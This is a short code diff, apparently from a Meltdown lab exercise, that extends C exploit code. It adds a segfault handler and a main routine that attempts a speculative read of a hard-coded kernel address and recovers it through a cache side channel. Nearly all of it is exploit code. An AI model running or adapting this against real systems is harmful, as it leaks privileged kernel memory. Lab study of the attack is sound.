@@ -44,6 +44,12 @@ void reloadSideChannel() {
 	}
 }
 
+// Signal Handler
+static sigjmp_buf jbuf;
+static void catch_segv() {
+	siglongjmp(jbuf, 1);
+}
+
 // Meltdown attack
 
 void meltdown(unsigned long kernel_data_addr) {
@@ -53,6 +59,17 @@ void meltdown(unsigned long kernel_data_addr) {
 	array[7 * 4096 + DELTA] += 1;
 }
 
-void meltdown_asm(unsinged long kernel_data_addr) {
+int main(int argc, char** argv) {
+	signal(SIGSEGV, catch_segv);
 
+	flushSideChannel();
+
+	if (sigsetjmp(jbuf, 1)==0) {
+		meltdown(0xf90fb000);
+	} else {
+		printf("Memory access violation\n");
+	}
+
+	reloadSideChannel();
+	return 0;
 }
